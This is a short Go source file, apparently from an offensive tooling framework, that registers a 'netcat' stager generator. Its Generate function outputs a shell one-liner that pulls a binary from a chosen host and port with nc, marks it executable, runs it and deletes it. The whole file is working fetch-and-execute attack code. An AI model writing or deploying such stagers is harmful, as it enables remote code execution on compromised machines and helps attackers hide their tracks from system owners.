package loader

import "fmt"

type netcatLoader struct{}

func init() { Register(&netcatLoader{}) }

func (n *netcatLoader) Name() string        { return "netcat" }
func (n *netcatLoader) Description() string { return "nc raw pull (no TLS)" }
func (n *netcatLoader) RequiresTool() string { return "nc" }

func (n *netcatLoader) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (n *netcatLoader) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`f=$(mktemp);(printf '%%s\n' '%s';sleep 1)|nc %s %s >$f;chmod +x $f;$f;rm -f $f`,
		opts.Token, opts.Host, opts.Port,
	), nil
}
